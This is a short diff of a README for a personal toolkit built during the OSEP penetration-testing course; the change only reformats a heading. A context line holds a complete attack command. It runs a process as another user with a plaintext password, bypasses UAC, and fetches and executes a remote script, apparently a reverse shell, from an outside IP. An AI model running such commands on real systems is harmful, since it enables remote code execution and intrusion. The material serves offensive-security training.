@@ -1,6 +1,6 @@
 Just a bunch of tools built/gathered along the OSEP course.
 
-# <ins>Useful Basic Commands</ins>:
+# Useful Basic Commands:
 
 ### <ins>Run command as another user</ins>:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
